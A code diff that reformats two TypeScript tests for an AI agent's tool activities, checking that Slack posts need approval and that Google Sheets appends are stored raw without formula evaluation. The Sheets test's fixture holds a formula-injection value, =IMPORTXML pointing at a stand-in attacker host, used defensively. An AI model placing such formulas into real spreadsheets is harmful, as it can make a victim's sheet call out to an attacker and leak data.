@@ -345,16 +345,14 @@ describe('activities (PGlite + fake Gateway/Composio)', () => {
 
   it('a Slack post is approval-gated, shows its channel, and runs once with the exact args', async () => {
     const { taskId, ownerId } = await seed(h);
-    await h.db
-      .insert(schema.connectedAccounts)
-      .values({
-        ownerId,
-        toolkit: 'slack',
-        composioUserId: 'sa_user_alice',
-        composioConnectedAccountId: 'ca_alice_slack',
-        status: 'active',
-        lastVerifiedAt: new Date(),
-      });
+    await h.db.insert(schema.connectedAccounts).values({
+      ownerId,
+      toolkit: 'slack',
+      composioUserId: 'sa_user_alice',
+      composioConnectedAccountId: 'ca_alice_slack',
+      status: 'active',
+      lastVerifiedAt: new Date(),
+    });
     const args = { channel: 'C0123', markdown_text: 'Ship it' };
     h.script.push(toolCallOutput('c1', 'slack_send_message', args));
     await h.acts.modelDecision({ taskId, ownerId, step: 0 });
@@ -377,16 +375,14 @@ describe('activities (PGlite + fake Gateway/Composio)', () => {
 
   it('a Sheets append is stored RAW and cannot ask for formula evaluation', async () => {
     const { taskId, ownerId } = await seed(h);
-    await h.db
-      .insert(schema.connectedAccounts)
-      .values({
-        ownerId,
-        toolkit: 'googlesheets',
-        composioUserId: 'sa_user_alice',
-        composioConnectedAccountId: 'ca_alice_sheets',
-        status: 'active',
-        lastVerifiedAt: new Date(),
-      });
+    await h.db.insert(schema.connectedAccounts).values({
+      ownerId,
+      toolkit: 'googlesheets',
+      composioUserId: 'sa_user_alice',
+      composioConnectedAccountId: 'ca_alice_sheets',
+      status: 'active',
+      lastVerifiedAt: new Date(),
+    });
     const row = { spreadsheetId: 'sheet_1', range: 'Sheet1!A1', values: [['=IMPORTXML("https://evil.example")', 1]] };
     h.script.push(
       toolCallOutput('c1', 'googlesheets_spreadsheets_values_append', { ...row, valueInputOption: 'USER_ENTERED' }),
